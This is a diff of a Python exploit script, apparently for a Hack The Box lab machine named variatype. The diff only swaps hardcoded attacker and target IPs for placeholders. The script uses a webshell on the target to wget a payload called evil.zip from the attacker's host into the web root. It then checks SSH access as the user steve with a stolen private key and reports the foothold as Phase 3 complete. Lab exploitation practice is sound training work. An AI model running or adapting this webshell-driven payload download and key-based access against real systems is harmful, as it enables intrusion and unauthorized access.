@@ -46,7 +46,7 @@ def upload_and_trigger():
         stderr=subprocess.DEVNULL
     )
     
-    LHOST = "10.10.14.241"
+    LHOST = "<Your_IP_Address>"
     
     # Download to target via webshell
     url = f"http://portal.variatype.htb/files/shell.php?cmd=wget%20http://{LHOST}:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"
@@ -69,7 +69,7 @@ def verify_ssh():
     """Verify SSH access as steve"""
     print("[*] Testing SSH as steve...")
     
-    RHOST = "10.129.7.194"
+    RHOST = "<Tareget_IP>"
     result = subprocess.run(
         ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
          "-i", "/tmp/steve_key", f"steve@{RHOST}", "whoami"],
@@ -109,7 +109,7 @@ def main():
     
     if verify_ssh():
         print("\n[+] Phase 3 complete! You now have SSH access as steve.")
-        print("    ssh -i /tmp/steve_key steve@10.129.7.194")
+        print("    ssh -i /tmp/steve_key steve@<Tareget_IP>")
     else:
         print("\n[-] Phase 3 failed. Check if cron is running or try again.")
 
